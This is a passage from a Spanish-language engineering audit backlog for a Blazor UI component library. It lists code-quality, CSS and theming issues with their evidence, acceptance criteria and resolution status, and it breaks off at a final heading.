  4. Tests siguen pasando porque `InternalsVisibleTo` cubre integración.

---

### `BASE-07` — 4 componentes heredan `ComponentBase` directamente en lugar de `BUIComponentBase` / `BUIInputComponentBase` — mezcla de intencional y omisión

- **Estado**: ✅ Resuelto (commit `2a51895`) — añadido XML-doc a los 4 tipos documentando que la herencia de `ComponentBase` es intencional: `DropdownOption<TOption>` y `RadioOption<TOption>` son registration-only (se registran con el container vía cascading y no emiten DOM); `BUIBasePattern` emite layout custom (container box + span children) en vez del root `<bui-component>`; `BUITreeNodeBase<TRegistration>` es registration-only para tree containers. Criterio 4 (lint check) delegado a `COMP-LINT-01`. Migración estructural descartada — las 4 excepciones tienen razón de diseño.
- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**:
  - `src/CdCSharp.BlazorUI/Components/Forms/Dropdown/DropdownOption.cs:7` — `DropdownOption<TOption> : ComponentBase`
  - `src/CdCSharp.BlazorUI/Components/Forms/Radio/RadioOption.cs:5` — `RadioOption<TOption> : ComponentBase`
  - `src/CdCSharp.BlazorUI/Components/Utils/Patterns/Abstractions/BUIBasePattern.cs:5` — `BUIBasePattern : ComponentBase, IPatternJsCallback, IAsyncDisposable`
  - `src/CdCSharp.BlazorUI/Components/Generic/Tree/Abstractions/BUITreeNodeBase.cs:6` — `BUITreeNodeBase<TRegistration> : ComponentBase`
- **Evidencia**: `DropdownOption` y `RadioOption` son *registration-only* (se registran con un container vía cascading y **no emiten DOM propio**) — herencia desde `ComponentBase` es razonable, pero no hay comentario que lo explique. `BUIBasePattern` y `BUITreeNodeBase` **sí son abstract classes de DOM-visible components** (los patterns emiten SVG/canvas; los tree nodes renderizan nodo+descendientes). Éstos deberían heredar de `BUIComponentBase` para obtener el pipeline de `<bui-component>` + `data-bui-*` o justificar explícitamente la exención.
- **Criterios de aceptación**:
  1. Para `DropdownOption` / `RadioOption`: añadir XML-doc "config-only, no DOM" y `[EditorBrowsable(EditorBrowsableState.Never)]` sobre `BuildRenderTree` no aplica (no lo tienen). Simplemente documentar.
  2. Para `BUIBasePattern`: evaluar migración a `BUIComponentBase`. Si los patterns no necesitan el pipeline de style (son SVG decorative), consolidar como `BUIPatternBase` con justificación.
  3. Para `BUITreeNodeBase`: migrar a `BUIComponentBase`. Los nodos del tree deberían participar en el contrato `<bui-component>` + `data-bui-*` para que el CSS de `_data-collection-family.css` los alcance.
  4. Añadir lint check (test o análisis simple) que emita warning si `class X : ComponentBase` aparece en `src/CdCSharp.BlazorUI/Components/**`.

---

### `BASE-08` — `SetParametersAsync` de `BUIInputComponentBase<TValue>` asigna `Dictionary<string, object?>` + `ParameterView.FromDictionary` en cada render cuando falta `ValueExpression`

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIInputComponentBase.cs:47-67`.
- **Evidencia**: El override inyecta `ValueExpression = () => Value!` cuando el consumidor usa el input fuera de un `EditForm` (sin `EditContext` cascading ni `ValueExpression` explícito). El path crea `Dictionary<string, object?> patched`, itera `parameters`, reinserta entradas, añade el expression, y construye un nuevo `ParameterView` vía `FromDictionary`. Cada re-render repite el ciclo. Para consumidores que usan el componente sin `EditForm` (caso muy común: dropdowns standalone, switches de settings), es el camino caliente.
- **Criterios de aceptación**:
  1. Cachear el `Expression<Func<TValue>>? _valueExpressionFallback` una sola vez (en el primer `SetParametersAsync` donde lo necesite) y reutilizarlo.
  2. Reducir el overhead del patch: si es posible, concatenar un único `ParameterValue` sintético en lugar de reconstruir el `ParameterView` desde `Dictionary`.
  3. Medir con el `IBUIPerformanceService` antes/después: objetivo `< 50 µs` adicionales por render en el path fallback en Blazor Server.
- **Notas**: depende de `BASE-01` para decidir dónde vive `SetParametersAsync` tras unificar el pipeline.

---

### `BASE-09` — `BUIInputComponentBase.IsDisabled` acopla `Disabled` con `IHasLoading.Loading` sin escape hatch documentado

- **Estado**: ✅ Resuelto (commit `fae6782`) — `IsDisabled` pasa a `public virtual bool IsDisabled` (criterio 1 aplicado). Inputs derivados pueden override para desacoplar `Loading` del estado deshabilitado (caso de uso: search-box con debounce que muestra spinner pero sigue aceptando teclas). XML doc inline explica el contrato. Criterio 2 (parámetro dedicado `DisableWhileLoading`) descartado: ampliar la superficie del input base por una excepción rara no compensa; el override es expresivo y opt-in. Criterio 3 (doc en CLAUDE.md) opcional — el comentario inline cubre el "why" donde el dev lo encuentra. 294/294 tests de input siguen verdes.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIInputComponentBase.cs:34`.
- **Evidencia**: `public bool IsDisabled => Disabled || (this is IHasLoading loading && loading.Loading);`. Cualquier input que implemente `IHasLoading` queda con `data-bui-disabled="true"` cuando está cargando, lo que desactiva pointer events, opacity, focus ring, etc. El acoplamiento no es virtual: no hay override posible. Para inputs que quieran mostrar un spinner **pero permitir que el usuario siga tecleando** (ej. búsqueda con debounce) no hay forma de desacoplar.
- **Criterios de aceptación**:
  1. Convertir `IsDisabled` en `virtual`, o extraerlo a un método con override.
  2. Alternativa: introducir una propiedad separada `DisableWhileLoading` (default `true`) que controle el acoplamiento.
  3. Documentar el comportamiento por defecto en XML-doc de `IHasLoading` / `BUIInputComponentBase` y en `CLAUDE.md`.

---

### `BASE-10` — `ToKebabCaseComponentName` hace *strip* case‑insensitive del prefijo `BUI`: tipos legítimos que empiezan por `Bui*` (minúsculas) quedan mutilados

- **Estado**: ✅ Resuelto (commit `109a3fc`) — `StringComparison.InvariantCultureIgnoreCase` → `StringComparison.Ordinal`. Ahora sólo se elimina el prefijo canónico `BUI` en mayúsculas. `BuiltInPopup` queda como `built-in-popup` (antes `lt-in-popup`); un consumidor con `BuiCustom` se respeta (`bui-custom`). Comment inline explica la decisión. Todos los tipos actuales del framework siguen usando `BUI` mayúsculas — no hay regresión.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIComponentAttributesBuilder.cs:246-273`.
- **Evidencia**: `if (value.StartsWith("BUI", StringComparison.InvariantCultureIgnoreCase)) { value = value[3..]; }`. Un tipo futuro llamado `BuiltInPopup` quedaría con `value = "ltInPopup"` y el data-attr resultante `lt-in-popup`. Aunque hoy toda la librería usa prefijo `BUI` mayúsculas, la comparación debería ser `Ordinal` para evitar el stripping de falsos positivos. Además, si un consumidor (heredando de la base class en su propio proyecto) nombra su componente `BuiCustom`, el strip agresivo produce `data-bui-component="custom"` colisionando con el namespace del framework.
- **Criterios de aceptación**:
  1. Cambiar `InvariantCultureIgnoreCase` → `Ordinal`.
  2. Test de regresión: `ComputeTypeInfo` sobre `class BuiltIn : BUIComponentBase` emite `data-bui-component="built-in"` no `"lt-in"`.
  3. Considerar también: no hacer strip de `BUI` si el nombre completo es `"BUI"` (degeneración) o `"BUIComponent"`.

---

### `COMP-INPUTDROPDOWN-02` — `BUIInputDropdown.OnParametersSet` no invoca `base.OnParametersSet()`: pipeline roto

- **Estado**: ✅ Resuelto (commit `3084dfa`) — `base.OnParametersSet();` añadido al principio del override. 110 tests de Dropdown verdes.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Forms/Dropdown/BUIInputDropdown.razor:191-194`.
- **Evidencia**: `protected override void OnParametersSet() { _selectionState.SetValue(Value); }`. No hay `base.OnParametersSet()`. Aunque `BUIInputDropdown` hereda de `ComponentBase` (no de `BUIComponentBase` — intencional per `CLAUDE.md`), la omisión puede saltarse inicialización del framework si en el futuro se introduce un base intermedio, y es una convención rota dentro de la librería (todos los demás componentes llaman `base.OnParametersSet()`).
- **Criterios de aceptación**:
  1. Añadir `base.OnParametersSet();` al principio del método.
  2. Verificar con test que el componente sigue funcionando tras el cambio (no cambia nada observable hoy, pero deja el patrón consistente).

---

### `COMP-HARDCODED-KEBAB-01` — `BUIToastHost` hardcodea `data-bui-component="toast-host"` en lugar de dejar que el builder lo derive

- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/Toast/BUIToastHost.razor:18`.
- **Evidencia**: se repite con el mismo problema que `COMP-TOASTHOST-01`. Ver también que **ningún otro componente** del proyecto hardcodea `data-bui-component` — lo emite `BUIComponentAttributesBuilder.ComputeTypeInfo` desde el nombre del tipo. Un rename futuro de `BUIToastHost` → `BUIToastPortal` dejaría el `data-bui-component="toast-host"` desincronizado.
- **Criterios de aceptación**:
  1. Con la refactorización de `COMP-TOASTHOST-01`, usar `@attributes="ComputedAttributes"` que ya emite `data-bui-component="toast-host"` automáticamente.
  2. Eliminar el literal hardcoded del template.

---

### `COMP-AUDIT-CHECKLIST-01` — Pase per‑component del checklist de 13 ítems (`§3.7` del plan) pendiente de completar individualmente

- **Severidad**: Minor
- **Esfuerzo**: XL
- **Alcance**: 28 componentes listados en `ANALYSIS.md §3.7`: `Badge, Button, CodeBlock, DataCollections, Loading, Svg, Switch (Generic), Tabs, Tree, Checkbox, Color, DateAndTime, Dropdown, Number, Radio, Switch (Forms), Text, TextArea, BlazorLayout, Initializer, Card, Dialog, Grid, SidebarLayout, StackedLayout, ThemeGenerator, ThemeSelector, Toast`.
- **Evidencia**: El análisis F1 ha hecho una pasada **horizontal** (grep global) que identificó violaciones transversales (`COMP-TOASTHOST-01..03`, `COMP-TIMEPICKER-01`, `COMP-COLORPICKER-01`, `COMP-STATE-CLASS-01`, `COMP-INPUTDROPDOWN-01..02`, `COMP-HARDCODED-KEBAB-01`). Queda pendiente la pasada **vertical** por cada uno de los 28 componentes: verificar individualmente los 13 ítems del checklist (`Root`, `data-bui-component`, `IHas*` vs CSS, familia declarada, parámetros coherentes, validación con `EditContext`, cascading, razor sin lógica compleja, eventos de teclado, `ElementReference` liberados, `StateHasChanged` justificado, `ChildContent` apropiado, unmatched attributes). Las violaciones individuales (p.ej. un `@onkeydown` faltante en `BUISelect`, un `ElementReference` huérfano en `BUIDialog`) requieren inspección archivo a archivo.
- **Criterios de aceptación**:
  1. Iterar por cada componente en orden alfabético (o por folder como están en `§2.1` de `ANALYSIS.md`) abriendo sub-tareas `COMP-<Component>-<NN>` por cada ítem fallido.
  2. Para componentes **limpios** (pasan los 13 ítems sin issue), registrar el resultado en un checklist dentro de esta tarea (una línea por componente) marcado `[x]`.
  3. Estimar ~2-4 tareas promedio por componente (extrapolando de los encontrados): total estimado 50-100 sub-tareas adicionales.
  4. Ejecución durante F2 en paralelo con `§3.8 CSS-SCOPED` (muchos fixes de `COMP-*` requerirán ajuste de CSS scoped — cerrarlos juntos).
- **Notas**: esta es deliberadamente una meta‑task: el coste de detectar exhaustivamente todos los 13×28 = 364 ítems en F1 no se justifica; F2 los abre conforme se toca cada componente. Mantener esta tarea abierta hasta que el checklist interno esté completo.

---

### `CSS-SCOPED-05` — `BUIGridItem.razor.css` usa `!important` 10× en `@media` responsive sin justificación

- **Estado**: ✅ Resuelto (commit `e1fc99b`) — auditoría: los 10 `!important` están en `display: none`/`display: block` para los pares utilitarios `[data-hide-{xs..xl}]` / `[data-show-{xs..xl}]`. Son contrato de utility-class (mismo patrón que Bootstrap `.d-none` / Tailwind `.hidden`): al activar `data-hide-md` el consumidor espera que el item desaparezca a ese breakpoint sin importar variantes, scoped CSS o inline `display: flex` que puedan colisionar. Sin `!important` cualquier `display: flex` no relacionado gana. Criterio 3 aplicado: cabecera de bloque añadida sobre la sección responsive documentando el porqué (utility-class semantics, paralelismo con Bootstrap/Tailwind). Criterios 1-2 (eliminar el `!important`) descartados — cambiaría el contrato y haría las utilities frágiles. Cierra `CSS-SCOPED-06` en spirit (mismo principio aplicado a otros sitios donde `!important` defiende contrato utilitario).
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/Grid/BUIGridItem.razor.css:77-184`.
- **Evidencia**: 10 ocurrencias de `!important` dentro de `@media (min-width: ...)` para sobrescribir `grid-column` / `grid-row` / `display`. Sin comentario que explique por qué la especificidad normal no basta. Blazor CSS scoping ya aumenta la especificidad vía `[b-xxxx]`, así que `!important` es sospecha de bug: probablemente se añadió para pelear con un selector más específico en otro sitio que debería resolverse en su origen.
- **Criterios de aceptación**:
  1. Auditar los 10 `!important`: para cada uno, reproducir el caso sin `!important` y documentar la cascada que obligó a añadirlo.
  2. Si el culprit es una regla del bundle global (`_base.css`), arreglar allí la especificidad/orden y eliminar el `!important`.
  3. Si es realmente necesario (patrón layout responsive), añadir comentario `/* !important: responsive breakpoint overrides user layout */` en cada aparición.
- **Notas**: alinea con `CSS-SCOPED-07` (`@media` queries en layout).

---

### `CSS-SCOPED-06` — `BUITreeMenu.razor.css` usa `!important` 1× sin justificación

- **Estado**: ✅ Resuelto (commit `e1fc99b`) — el `!important` en `padding-left` del flyout submenu peleaba contra los selectores de profundidad inline (`[data-bui-expand-mode="inline"] .bui-tree-menu__item[data-depth="N"] > .bui-tree-menu__link`, specificity 5,1) que también matchean los items dentro de un flyout submenu. Sustituido por dos selectores espejo (uno con `[data-bui-expand-mode="inline"]` + `[data-depth]`, otro con `[data-bui-expand-mode="flyout"]`), ambos con misma o mayor specificity y declarados después en el archivo → ganan por source order sin `!important`. Comentario inline documenta el por qué. `grep -c '!important' BUITreeMenu.razor.css` → 0 hits reales (1 hit en comentario explicativo). 48 tests de TreeMenu pasan.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Generic/Tree/TreeMenu/BUITreeMenu.razor.css` (ubicación concreta a localizar durante fix).
- **Evidencia**: grep `!important` devuelve 1 ocurrencia en este archivo. Menos severo que `BUIGridItem` pero mismo principio.
- **Criterios de aceptación**:
  1. Reproducir el caso sin `!important`.
  2. Eliminar o, si justificado, comentar en línea.
- **Notas**: se puede agrupar con `CSS-SCOPED-05` en un único PR de limpieza.

---

### `CSS-SCOPED-07` — `@media` queries en 5 archivos scoped (layout): regla 5 prohíbe per-size selectors pero admite excepciones de layout — documentar

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: 5 archivos con 21 queries `@media` totales: `BUIGridItem.razor.css`, `BUISidebarLayout.razor.css`, `BUIStackedLayout.razor.css`, `BUIDialog.razor.css`, `BUIDataTable.razor.css` (confirmar lista).
- **Evidencia**: regla 5 del estándar CLAUDE.md: "Sizing via multiplier, not breakpoints: do not add per-size selectors". Pero componentes de *layout* (Grid, Sidebar, Stacked) razonablemente necesitan breakpoints para comportamiento responsive que no se reduce a multiplicador de tamaño. El estándar no explicita esta excepción.
- **Criterios de aceptación**:
  1. Para cada `@media` query: clasificar como **(a)** legítimo (cambia flujo/disposición responsive), **(b)** degradación a multiplier (cambia tamaños — migrable a `--bui-size-multiplier` via `Size` param).
  2. Convertir (b) a multiplier donde aplique.
  3. Añadir excepción explícita en `CLAUDE.md` → `CLAUDE-xx`: "`@media` queries permitidas en componentes de familia Layout para flujo responsive; prohibidas en componentes de UI (Input, Picker, Generic) donde `Size`/`Density` resuelven el caso".
- **Notas**: tarea de deuda documental + migración selectiva. Alimenta `§3.23`.

---

### `CSS-BUNDLE-02` — `main.css` inserta `_scrollbar.css` entre theme init y tokens — diverge del orden documentado en `CLAUDE.md`

- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Infrastructure/BuildTemplates.cs:13-35` (template `main.css`).
- **Evidencia**: orden real:
  ```
  _reset.css → _typography.css → _themes.css → _initialize-themes.css → _scrollbar.css → _tokens.css → _base.css → _transition-classes.css → families
  ```
  Orden documentado en `CLAUDE.md`:
  ```
  _reset.css → _typography.css → _themes.css + _initialize-themes.css → _tokens.css → _base.css → _transition-classes.css → families
  ```
  `_scrollbar.css` no está documentado en ningún paso. Dado que CSS custom properties son late-bound, no hay un bug funcional (`_scrollbar.css` puede referenciar `--palette-*` definidas en `_themes.css`), pero la posición "entre theme-init y tokens" es arbitraria.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-12]** Crear `ScrollbarCssGenerator` dedicado en `src/CdCSharp.BlazorUI.BuildTools/Generators/` con `[AssetGenerator]`, `FileName = "_scrollbar.css"`. Mueve el CSS de scrollbar hoy generado por el path inline. Usa `FeatureDefinitions` para cualquier variable consumida (colores de paleta, ancho de scrollbar, border-radius).
  2. Orden de carga definitivo en `main.css`: `_reset.css → _typography.css → _themes.css → _initialize-themes.css → _tokens.css → _base.css → _scrollbar.css → _transition-classes.css → families`. El scrollbar pertenece a "Universal Component Styles" (opción b), tras `_base.css` y antes de `_transition-classes.css`.
  3. Actualizar `CLAUDE.md` §CSS architecture con la lista ordenada (8 archivos, numerados 1–8).
  4. Añadir comentario en el template de `main.css` apuntando al CLAUDE.md como fuente de verdad del orden.
- **Notas**: alinea con `BLD-PIPE-08` (scope global de scrollbar) y `CSS-BUNDLE-04` (documentación del orden). Decisión D-12 (ver §Directivas de diseño): generador propio + orden tras `_base.css`.

---

### `CSS-BUNDLE-03` — `CssThemeGenerator.Generate` usa `.Replace("--dark-", "--palette-")` encadenado: renombrado frágil basado en prefijo de la paleta

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/ThemesCssGenerator.cs:38,51`.
- **Evidencia**:
  ```csharp
  string key = variable.Key.Replace("--dark-", "--palette-").Replace("--light-", "--palette-");
  ```
  El generator asume que `GetThemeVariables()` devuelve claves prefijadas con `--dark-` (para DarkTheme) o `--light-` (para LightTheme) y hace rename textual. Problemas:
    1. Si un futuro tema se llama p. ej. `HighContrast` con prefijo `--highcontrast-`, no se convierte y la variable queda con el prefijo del tema (no `--palette-*`).
    2. Si cualquier clave contiene la subcadena `--dark-` o `--light-` en el medio (p. ej. `--button--light-variant`), se rompe.
    3. La palabra "--palette-" está hardcoded aquí y en `FeatureDefinitions`; no está centralizada.
- **Criterios de aceptación**:
  1. Que `BUIThemePaletteBase.GetThemeVariables()` devuelva directamente `--palette-<name>` (sin prefijo tema‑específico), y que el generator no necesite hacer replace.
  2. O, si se mantiene el prefijo por tema: centralizar el prefijo esperado en `BUIThemePaletteBase.Prefix` (`"--dark-"` / `"--light-"`) y hacer el replace con `StartsWith` en lugar de `Replace`.
  3. Añadir test que cubra una paleta con un nombre no-`light/dark` para blindar el fallback.
- **Notas**: alinea con `BLD-PIPE-09` (cobertura de paleta completa) y `API-02` (centralización de strings del framework).

---

### `CSS-BUNDLE-04` — No hay verificación de paridad Light/Dark en el set de variables `--palette-*`: claves ausentes pasan silenciosamente

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/ThemesCssGenerator.cs:32-54`, `src/CdCSharp.BlazorUI.Core/Themes/{LightTheme,DarkTheme}.cs`.
- **Evidencia**: el generator itera `palette.GetThemeVariables()` de cada paleta de forma independiente; no hay assert de que el set de claves es idéntico en Light y Dark. Si `DarkTheme` define `--palette-surface` pero `LightTheme` olvida declararlo, al cambiar a Light el componente hereda el valor de `:root` (DarkTheme, default) y se produce un degradado inconsistente ("mostly light con algunos pixeles dark") imposible de detectar sin theming QA manual.
- **Criterios de aceptación**:
  1. Añadir validación build‑time al generator: construir `HashSet<string>` por paleta, hacer `SymmetricExceptWith`, y emitir warning/error si es no‑vacío.
  2. Test: `LightTheme.GetThemeVariables().Keys` debe ser igual a `DarkTheme.GetThemeVariables().Keys` (set equality).
  3. Mensaje de error accionable: "theme 'light' missing variables {X}; 'dark' missing variables {Y}".
- **Notas**: prerequisito de theming robusto; también refuerza `BLD-PIPE-09`.

---

### `CSS-OPT-03` — `transition: all` en 3 archivos scoped: coste de layout invalidation innecesario

- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `BUICard.razor.css`, `BUIThemeSelector.razor.css`, `BUIModalContainer.razor.css`.
- **Evidencia**: `transition: all 0.3s ease` fuerza al navegador a evaluar **todas** las propiedades transicionables en cada repaint, incluyendo `width`/`height`/`top`/`left` que disparan layout. Sustituir por listas específicas (`transition: background-color 0.2s, color 0.2s, border-color 0.2s`) evita el coste y da control explícito sobre qué anima.
- **Criterios de aceptación**:
  1. Auditar cada `transition: all` y reemplazar por lista de propiedades reales que el componente anima.
  2. Usar tokens `var(--bui-transition-duration-*)` / `var(--bui-transition-timing-*)` si existen (ver `BLD-PIPE-10`).
  3. Test visual: la transición sigue percibiéndose igual para el usuario final.
- **Notas**: micro-optimización; bueno como parte de `REL` checklist.

---

### `CSS-OPT-04` — Forma canónica de selectores descendientes inconsistente: unos archivos usan `.bui-x__y` y otros `bui-component[...] .bui-x__y`

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: transversal a `*.razor.css` y `CssBundle/*.css`.
- **Evidencia**: el estándar CLAUDE.md regla 2 manda `bui-component[data-bui-component="<name>"]` como root; por coherencia los descendants serían `bui-component[data-bui-component="<name>"] .bui-<name>__<elem>`. Parte del repo sigue esa forma (p. ej. `BUIThemeSelector.razor.css:79` con cadena completa), pero otra parte usa `.bui-<name>__<elem>` directamente (aparece ≈en la mayoría de `.razor.css` como alias corto gracias a CSS scoping de Blazor que añade el atributo `[b-xxx]`).
- **Criterios de aceptación**:
  1. **[Decisión F1 D-13]** Adoptar forma **corta**: `[data-bui-component="X"]` para el root del componente y `.bui-<name>__<elem>` directamente para descendants. Blazor CSS isolation inyecta `[b-xxx]` con specificity suficiente para aislar por scope.
  2. Aplicar la decisión de forma consistente a los 52 archivos `.razor.css`: reemplazar `bui-component[data-bui-component="X"]` por `[data-bui-component="X"]` (quitar el prefijo `bui-component`). En `CssBundle/*.css` (global, sin scoping) mantener la forma completa `bui-component[data-bui-component="X"]` si procede — validar en generators.
  3. Actualizar CLAUDE.md §CSS architecture regla 2 para documentar la forma corta como canónica en scoped `.razor.css`.
  4. Pasar lint/audit (`CSS-OPT-02`): todos los 52 archivos usan la forma corta en root.
- **Notas**: decisión estética/performance; el grep comparativo al cerrar `CSS-OPT-02` dará cifras exactas. Decisión D-13 (ver §Directivas de diseño): forma corta confirmada para scoped.

---

### `CSS-OPT-05` — Clases aplicadas en `.razor` sin selector CSS correspondiente (clases "fantasma")

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: inventario cross-repo; se materializa como subtask del output de `CSS-OPT-02`.
- **Evidencia**: `§3.10` paso 12 del plan distingue dos casos: **(a)** clase pensada como hook de override público (documentable) y **(b)** residual de refactor (eliminable). Ambos se detectan por diferencia `ClasesEnMarkup - ClasesDeclaradas`.
- **Criterios de aceptación**:
  1. Usar output de `CSS-OPT-02` para listar clases "fantasma".
  2. Clasificar cada una como (a) o (b).
  3. Clase (a) → añadir a documentación de API pública (override hooks). Clase (b) → eliminar del markup.
  4. Cada clase (a) debe tener un test de integración que verifique que sobrevive al refactor ("user applies .bui-button__override → DOM expone la clase").
- **Notas**: sub-entregable de `CSS-OPT-02`. Depende estrictamente de esa tarea.

---

### `THEME-04` — `Surface = new CssColor("#FFFFFFF0".Substring(0, 7))` en LightTheme: hack que produce `#FFFFFF` por substring

- **Estado**: ✅ Resuelto (commit `1f66f62`) — `Surface = new CssColor("#FFFFFF")`. El `.Substring(0,7)` devolvía el mismo valor; se retira el hack. Si en futuro se quiere alpha sobre Surface, reescribir como `rgba(...)` directo.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Themes/LightTheme.cs:23`.
- **Evidencia**: `"#FFFFFFF0".Substring(0, 7)` devuelve `"#FFFFFF"`; equivalente a escribir `"#FFFFFF"` directamente. El `F0` trailing (alpha 240/255) se descarta. Parece un residuo de una iteración donde se consideraba Surface con alpha < 1.
- **Criterios de aceptación**:
  1. Sustituir por `new CssColor("#FFFFFF")` o, si Surface debe tener alpha, por `new CssColor("#FFFFFFF0")` sin substring (que el parser maneja vía `ParseHex` ramo de 8 chars).
  2. Test: `new LightTheme().Surface.ToString()` == valor esperado.
- **Notas**: mismo anti-patrón que `CssColor.ToString(ColorOutputFormats.Hex) => Value.Substring(0, 7)` — ambos revisables juntos.

---

### `THEME-05` — `DarkTheme.Shadow = #777777` más claro que `Background = #121417`: drop‑shadow no simula elevación en modo oscuro

- **Estado**: 🟡 Parcial (commit `4e0c413`) — criterio 4 aplicado: `DarkTheme.Shadow = rgba(0,0,0,0.5)`. Fix mínimo para que el box-shadow simule elevación real en lugar del glow anterior. Los criterios 1-3 (sistema M3 tonal elevation overlay con `IHasElevation` + 5 niveles `--palette-surface-elevation-N`) quedan como follow-up — es cambio de diseño mayor (nueva interfaz `IHas*`, migración de componentes con `IHasShadow`, breaking change 1.0). Se re-abrirá como `THEME-05b` cuando toque.
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Themes/DarkTheme.cs:64`. Consumido por `--palette-shadow` en componentes con `IHasShadow`.
- **Evidencia**: en Dark mode (`Background = #121417`, muy oscuro), aplicar `box-shadow: 0 2px 8px #777777` produce un halo *más claro* que el fondo → efecto de brillo/glow, no de elevación. Material Design 3 resuelve esto con *tonal elevation* (surfaces tinted more toward the primary color as elevation grows) o con shadow de color casi-negro muy difuso.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-11]** Adoptar sistema de **elevation overlay** (surface tint por nivel) para Dark mode. Introducir variables `--palette-surface-elevation-1` ... `--palette-surface-elevation-5` en la paleta, calculadas como `color-mix(in oklab, var(--palette-surface), var(--palette-primary) N%)` con N creciente (p. ej. 3, 6, 9, 12, 16 %).
  2. `BUICard`, `BUIDialog`, `BUIDrawer`, `BUIModalContainer`, `BUIToast` (componentes con `IHasShadow`) consumen `var(--palette-surface-elevation-N)` para `background-color` en Dark y mantienen `box-shadow` real en Light.
  3. Añadir atributo `data-bui-elevation="1..5"` como nueva feature (interface `IHasElevation` + entrada en `FeatureDefinitions`) para que los componentes declaren su nivel explícitamente.
  4. `DarkTheme.Shadow` puede retirarse o quedar como fallback `rgba(0,0,0,0.5)` para consumidores legacy.
  5. Validar visualmente con `BUICard` e `BUIDialog` en ambos temas: Dark usa tint, Light usa shadow.
- **Notas**: se cruza con `THEME-02` (state layers en Dark usan overlays claros, no shadows). Decisión D-11 (ver §Directivas de diseño): elevation overlay confirmada, breaking change planificado en release notes 1.0.

---

### `THEME-06` — `ToCssVariableName` usa `.ToLowerInvariant()` sin separadores: `PrimaryContrast` → `primarycontrast` (sin guion), convención no documentada

- **Estado**: ✅ Resuelto (commit `b9967dd`) — `BUIThemePaletteBase.ToCssVariableName` reescrito (criterio 1, decisión D-10): inserta `-` antes de cada mayúscula interna y luego baja a `ToLowerInvariant`. Visibilidad pasa a `internal static` (era `private`) para permitir test directo. Reemplazo bulk en 61 ficheros de código (`.cs`, `.razor`, `.razor.css`, `.ts`, plus generadores que materializan `_themes.css`) cubre los 10 nombres compuestos: `primarycontrast`/`secondarycontrast`/`backgroundcontrast`/`successcontrast`/`warningcontrast`/`errorcontrast`/`infocontrast`/`surfacecontrast` → `*-contrast`; `hovertint`/`activetint` → `hover-tint`/`active-tint`. Migración aplica también a los aliases por tema (`--dark-X` / `--light-X`) — el generador es la única fuente. Criterio 2 cumplido: scope incluye scoped `.razor.css`, `BUIPalette.cs` (constructor que parsea claves desde el dict de paleta), generadores BuildTools (`InputFamilyCssGenerator`, `PickerFamilyGenerator`, `BaseComponentGenerator`, `TypographyGenerator`, `CssInitializeThemesGenerator`, `DataCollectionFamilyCssGenerator`), `ThemeInterop.ts`, samples, docs site, tests. Criterio 3 (release notes): nueva sección "Changed (breaking)" en `CHANGELOG.md [Unreleased]` lista las 10 renames con consejo a consumidores. Criterio 4 (test): nuevo `GetThemeVariables_Should_Emit_KebabCase_For_Compound_Names` en `ThemePaletteTests` afirma presencia de `--{id}-primary-contrast` / `-background-contrast` / `-surface-contrast` / `-hover-tint` / `-active-tint`, ausencia de cualquier clave terminada en `contrast`/`tint` sin guion previo, y preservación de los single-token (`--{id}-primary`, `--{id}-background`). 2581/2581 tests pasan; CLAUDE.md/AGENTS.md ya reflejan el nuevo formato. Cross con `API-02` queda intacta — `FeatureDefinitions` ya no hardcodea estos nombres.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Themes/Abstractions/BUIThemePaletteBase.cs:82`.
- **Evidencia**: `return propertyName.ToLowerInvariant();` — concatenaba sin convertir PascalCase a kebab-case. Resultado pre-fix: `--palette-primarycontrast`, `--palette-backgroundcontrast`, `--palette-successcontrast`, etc. El resto del framework usa kebab-case (`data-bui-data-collection`, `--bui-inline-background`). Inconsistencia que se volvía más crítica al añadir `PrimaryHoverBorder` → `--palette-primaryhoverborder` (ilegible).
- **Criterios de aceptación**:
  1. **[Decisión F1 D-10]** Migrar a **kebab-case**: `PrimaryContrast` → `--palette-primary-contrast`. Reescribir `ToCssVariableName` para convertir PascalCase insertando `-` antes de cada mayúscula interna (regex `([a-z])([A-Z])` → `$1-$2`, luego `ToLowerInvariant`).
  2. Actualizar todos los consumidores internos: `.razor.css` scoped y `CssBundle/*.css` generados (via regenerator de templates — no editar CSS directo).
  3. Documentar breaking change en release notes 1.0: consumidores con CSS override propio basado en `--palette-primarycontrast` deben migrar a `--palette-primary-contrast`.
  4. Añadir test en `BUIThemePaletteBaseTests` que verifique `ToCssVariableName("PrimaryContrast") == "primary-contrast"` y casos edge (`Background`, `SurfaceContrast`, `Primary`).
- **Notas**: alimenta `CLAUDE-xx` (§3.23). `API-02` (FeatureDefinitions como contrato congelado) es la tarea hermana. Decisión D-10 (ver §Directivas de diseño): kebab-case confirmada.

---

### `THEME-07` — `BUIThemePaletteBase.Black` y `White` expuestas como propiedades de paleta: emiten `--palette-black` / `--palette-white` que no son colores del tema

